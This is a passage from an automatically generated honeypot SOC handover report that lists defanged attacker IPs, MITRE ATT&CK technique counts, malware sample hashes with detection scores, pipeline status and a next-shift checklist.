| `101.36.107[.]233` | 1 | 2026-05-15 04:53 | 2026-05-15 04:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.23.122[.]235` | 1 | 2026-05-15 05:39 | 2026-05-15 05:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-05-15 06:18 | 2026-05-15 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.193.234[.]210` | 1 | 2026-05-15 05:42 | 2026-05-15 05:42 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.84[.]166` | 1 | 2026-05-15 05:38 | 2026-05-15 05:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.48.223[.]144` | 1 | 2026-05-15 05:36 | 2026-05-15 05:37 | 30s | 0 | `T1592` | 🟢 LOW |
| `35.216.234[.]82` | 1 | 2026-05-15 06:15 | 2026-05-15 06:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `41.153.30[.]115` | 1 | 2026-05-15 04:55 | 2026-05-15 04:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `79.6.181[.]193` | 1 | 2026-05-15 04:33 | 2026-05-15 04:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.78.6[.]235` | BE | Google LLC | **100** ⚠️ | 2 |
| `159.203.20[.]239` | CA | DigitalOcean, LLC | **100** ⚠️ | 1 |
| `14.48.223[.]144` | KR | Korea Telecom | **100** ⚠️ | 20 |
| `222.124.177[.]148` | ID | PT. TELEKOMUNIKASI INDONESIA | **100** ⚠️ | 50 |
| `79.6.181[.]193` | IT | Telecom Italia S.p.A. TIN EASY LITE | **100** ⚠️ | 20 |
| `117.205.3[.]26` | IN | NIB (National Internet Backbone) | **100** ⚠️ | 11 |
| `101.36.107[.]233` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `82.169.135[.]117` | NL | KPN B.V. | **100** ⚠️ | 1 |
| `76.124.3[.]157` | US | Comcast Cable Communications, Inc. | **100** ⚠️ | 44 |
| `121.229.9[.]97` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 155 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 76 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 63 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 37 |

---

## 🔕 False Positive Summary (62 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 51 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 530 cases |
| Tool 34  | Credential Extractor        | ✅ 139 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 62 filtered (11.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 76 priority case(s) shown individually · 15 recon entry/entries in table (6 group(s) consolidating 383 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-15T06:59:20Z_
